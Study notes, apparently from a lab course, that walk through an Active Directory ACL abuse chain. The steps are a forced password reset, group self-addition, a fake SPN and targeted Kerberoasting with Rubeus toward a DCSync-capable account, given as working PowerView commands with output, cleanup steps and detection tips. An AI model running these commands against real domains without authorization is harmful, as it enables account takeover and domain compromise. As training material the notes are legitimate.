
## Overview

ACL abuse turns dangerous Active Directory permissions into an attack path.

The source example chains several delegated rights together:

```text
wley
↓ ForceChangePassword
damundsen
↓ GenericWrite
Help Desk Level 1
↓ nested into
Information Technology
↓ GenericAll
adunn
↓ DCSync-capable rights
domain compromise path
```

The goal is to move from control of a low-privileged user to control of a user that can perform DCSync.

> [!warning]
> ACL abuse can modify Active Directory state. Password resets, group membership changes, SPN changes, ACL edits, and ownership changes should only be performed with explicit authorization and careful cleanup.

# Attack Chain Summary

## Starting Point

Controlled user:

```text
wley
```

How access was obtained in the source scenario:

```text
NTLMv2 hash captured with Responder
hash cracked offline with Hashcat
cleartext password recovered
```

Known ACL path:

```text
wley can force change damundsen's password
damundsen has GenericWrite over Help Desk Level 1
Help Desk Level 1 is nested into Information Technology
Information Technology has GenericAll over adunn
adunn has replication rights that enable DCSync
```

---

# High-Level Objective

Use controlled access to progress through the ACL chain:

```text
1. Authenticate as wley.
2. Reset damundsen's password.
3. Authenticate as damundsen.
4. Add damundsen to Help Desk Level 1.
5. Inherit Information Technology rights through nested group membership.
6. Use GenericAll over adunn.
7. Perform targeted Kerberoasting against adunn.
8. Crack adunn's password offline.
9. Authenticate as adunn.
10. Use adunn for DCSync in the next phase.
```

# Key Rights Used

| Right | Source Principal | Target | Impact |
|---|---|---|---|
| `ForceChangePassword` | `wley` | `damundsen` | Reset damundsen password |
| `GenericWrite` | `damundsen` | `Help Desk Level 1` | Add member to group |
| `MemberOf` | `Help Desk Level 1` | `Information Technology` | Inherit parent group rights |
| `GenericAll` | `Information Technology` | `adunn` | Full control over adunn |
| `DS-Replication-*` | `adunn` | Domain object | DCSync path |

# Step 1 – Create Credentials for wley

Create a secure string for the known `wley` password:

```powershell
$SecPassword = ConvertTo-SecureString '<PASSWORD HERE>' -AsPlainText -Force
```

Create a PSCredential object:

```powershell
$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword)
```

Purpose:

```text
authenticate to AD actions as wley without needing an interactive logon session as wley
```

---

# Step 2 – Prepare New Password for damundsen

Create the password value to set for `damundsen`:

```powershell
$damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
```

Purpose:

```text
prepare a SecureString password object for Set-DomainUserPassword
```

> [!warning]
> Resetting a user's password is disruptive. In a client environment, confirm approval before doing this.

---

# Step 3 – Reset damundsen Password

Import PowerView:

```powershell
cd C:\Tools\
Import-Module .\PowerView.ps1
```

Reset `damundsen`'s password using `wley`'s credentials:

```powershell
Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose
```

Expected successful output:

```text
[Get-PrincipalContext] Using alternate credentials
[Set-DomainUserPassword] Attempting to set the password for user 'damundsen'
[Set-DomainUserPassword] Password for user 'damundsen' successfully reset
```

Interpretation:

```text
wley successfully used ForceChangePassword over damundsen
```

# Step 4 – Create Credentials for damundsen

Create a secure string using the new `damundsen` password:

$SecPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
```

Create a PSCredential object for `damundsen`:

$Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\damundsen', $SecPassword)

Purpose:

perform follow-on AD actions as damundsen
```

# Step 5 – Confirm Help Desk Level 1 Membership

Before modifying the group, check current members:

```powershell
Get-ADGroup -Identity "Help Desk Level 1" -Properties * | Select -ExpandProperty Members
```

Purpose:

```text
confirm initial group membership
record baseline state
verify whether damundsen is already a member
```

> [!tip]
> Always record pre-change state before modifying users, groups, SPNs, ACLs, or passwords.

# Step 6 – Add damundsen to Help Desk Level 1

Add `damundsen` to the group using `damundsen`'s credentials:

```powershell
Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose
```

Expected output:

```text
[Get-PrincipalContext] Using alternate credentials
[Add-DomainGroupMember] Adding member 'damundsen' to group 'Help Desk Level 1'
```

Interpretation:

```text
damundsen used GenericWrite over Help Desk Level 1 to add itself to the group
```

# Step 7 – Confirm Group Membership Change

Check the group members:

```powershell
Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName
```

Look for:

```text
damundsen
```

Interpretation:

```text
damundsen is now a member of Help Desk Level 1
```

Why this matters:

```text
Help Desk Level 1 is nested into Information Technology
membership in Help Desk Level 1 grants inherited rights from Information Technology
Information Technology has GenericAll over adunn
```

---

# Step 8 – Use GenericAll Over adunn

At this point, the source scenario assumes:

```text
damundsen is now a member of Help Desk Level 1
Help Desk Level 1 is nested into Information Technology
Information Technology has GenericAll over adunn
```

Because `adunn` is an admin account that should not be interrupted, the source chooses targeted Kerberoasting instead of changing `adunn`'s password.

Rationale:

```text
GenericAll over adunn allows modifying the account
modifying the servicePrincipalName attribute can make adunn Kerberoastable
Kerberoasting can obtain a TGS hash for offline cracking
this avoids directly resetting the admin user's password
```

---

# Step 9 – Create a Fake SPN on adunn

Use `Set-DomainObject` to set a fake SPN:

```powershell
Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
```

Expected output:

```text
[Get-Domain] Using alternate credentials for Get-Domain
[Get-DomainSearcher] Using alternate credentials for LDAP connection
[Set-DomainObject] Setting 'serviceprincipalname' to 'notahacker/LEGIT' for object 'adunn'
```

Interpretation:

```text
adunn now has a servicePrincipalName value
adunn can now be targeted for Kerberoasting
```

> [!warning]
> This modifies the target user's AD attributes. Record the original state and clean up the SPN afterward.

---

# Step 10 – Kerberoast adunn

Use Rubeus:

```powershell
.\Rubeus.exe kerberoast /user:adunn /nowrap
```

Expected useful fields:

```text
Target User
Target Domain
SamAccountName
DistinguishedName
ServicePrincipalName
PwdLastSet
Supported ETypes
Hash
```

Example SPN:

```text
notahacker/LEGIT
```

Example hash format:

```text
$krb5tgs$23$*adunn$INLANEFREIGHT.LOCAL$notahacker/LEGIT@INLANEFREIGHT.LOCAL$...
```

Interpretation:

```text
Rubeus successfully requested a TGS for the fake SPN
the resulting hash can be cracked offline with Hashcat
```

---

# Step 11 – Offline Cracking

The source states the next step is to crack the hash offline using Hashcat.

Goal:

```text
recover the cleartext password for adunn
```

Result if successful:

```text
authenticate as adunn
perform DCSync in the next phase
```

# Cleanup Order

Cleanup order matters.

Required cleanup from the source:

```text
1. Remove fake SPN from adunn.
2. Remove damundsen from Help Desk Level 1.
3. Reset damundsen password back to original value if known.
```

Important reason:

```text
If you remove damundsen from the group first,
you may lose the rights needed to remove the fake SPN from adunn.
```

> [!important]
> Always clean up in an order that preserves the privileges needed to reverse your changes.

---

# Cleanup Step 1 – Remove Fake SPN

Clear `servicePrincipalName` from `adunn`:

```powershell
Set-DomainObject -Credential $Cred2 -Identity adunn -Clear serviceprincipalname -Verbose
```

Expected output:

```text
[Set-DomainObject] Clearing 'serviceprincipalname' for object 'adunn'
```

Interpretation:

```text
the fake SPN has been removed from adunn
```

---

# Cleanup Step 2 – Remove damundsen from Help Desk Level 1

Remove `damundsen` from the group:

```powershell
Remove-DomainGroupMember -Identity "Help Desk Level 1" -Members 'damundsen' -Credential $Cred2 -Verbose
```

Expected output:

```text
[Remove-DomainGroupMember] Removing member 'damundsen' from group 'Help Desk Level 1'
True
```

---

# Cleanup Step 3 – Confirm damundsen Was Removed

Check for `damundsen` in the group:

```powershell
Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName | ? {$_.MemberName -eq 'damundsen'} -Verbose
```

Expected result:

```text
no output
```

Interpretation:

```text
damundsen is no longer a member of Help Desk Level 1
```

---

# Cleanup Step 4 – Restore damundsen Password

The source notes that the password should be restored if possible:

```text
set the password for damundsen back to its original value if known
or
have the client set it / alert the user
```

Reason:

```text
the password reset changed AD state
the affected user or client should not be left with an unknown or attacker-set password
```

# Full Attack Flow

```text
1. Create PSCredential object for wley.
2. Create SecureString password for damundsen.
3. Use Set-DomainUserPassword to reset damundsen's password.
4. Create PSCredential object for damundsen.
5. Confirm current Help Desk Level 1 membership.
6. Add damundsen to Help Desk Level 1.
7. Confirm damundsen was added.
8. Use inherited Information Technology rights.
9. Set fake SPN on adunn.
10. Kerberoast adunn with Rubeus.
11. Crack TGS hash offline.
12. Remove fake SPN from adunn.
13. Remove damundsen from Help Desk Level 1.
14. Restore or coordinate reset of damundsen password.
15. Document all changes and cleanup.
```

# Operator Decision Points

## Password Reset

```text
If ForceChangePassword is available:
    confirm whether password reset is approved
    record original state if possible
    reset password only if permitted
```

## Group Modification

```text
If GenericWrite allows group membership modification:
    record original group membership
    add controlled principal
    confirm membership
    remove principal during cleanup
```

## Targeted Kerberoasting

```text
If GenericAll over a user exists:
    avoid password reset if account cannot be interrupted
    consider fake SPN targeted Kerberoasting if in scope
    remove fake SPN immediately after hash capture
```

## Cleanup Order

```text
If privilege depends on group membership:
    remove dependent attribute changes first
    then remove group membership
```

# SDDL Analysis

Event logs may store permission changes using **Security Descriptor Definition Language**, or SDDL.

Problem:

```text
SDDL is not human-readable by default
```

PowerShell can convert SDDL to a more readable format.

Example:

```powershell
ConvertFrom-SddlString "<SDDL_STRING>"
```

Useful output fields:

```text
Owner
Group
DiscretionaryAcl
SystemAcl
RawDescriptor
```

---

## Filter on DiscretionaryAcl

When reviewing converted SDDL, inspect:

```text
DiscretionaryAcl
```

Why:

```text
DACL entries show who was granted or denied permissions
```

The source notes that filtering on `DiscretionaryAcl` revealed a likely modification granting `mrb3n` `GenericWrite` over the domain object.

Interpretation:

```text
GenericWrite over the domain object may indicate an attack attempt
```

# Safety Notes

Some ACL attack chains may be:

```text
too destructive
too noisy
too time-consuming
too risky for production
```

In those cases:

```text
enumerate the path
validate enough evidence
present the finding to the client
avoid executing the full chain
```

> [!important]
> It is acceptable to stop at proof of path if executing the abuse would create unnecessary risk.

# Key Takeaways

- ACL abuse can chain multiple delegated permissions into domain compromise.
- The source path starts with `wley` and ends with `adunn` having DCSync-capable rights.
- `ForceChangePassword` can reset a target user password.
- `GenericWrite` over a group can support group membership abuse.
- Nested group membership can inherit powerful rights.
- `GenericAll` over a user can enable targeted Kerberoasting by setting a fake SPN.
- Rubeus can request a TGS for the modified SPN.
- Cleanup order matters: remove fake SPN before removing the group membership that enables the cleanup.
- All AD modifications must be documented.
- Event ID `5136` can indicate directory object modification.
- `ConvertFrom-SddlString` can make SDDL event data more readable.
- Organizations should audit dangerous ACLs, monitor high-impact group membership, and monitor ACL changes.
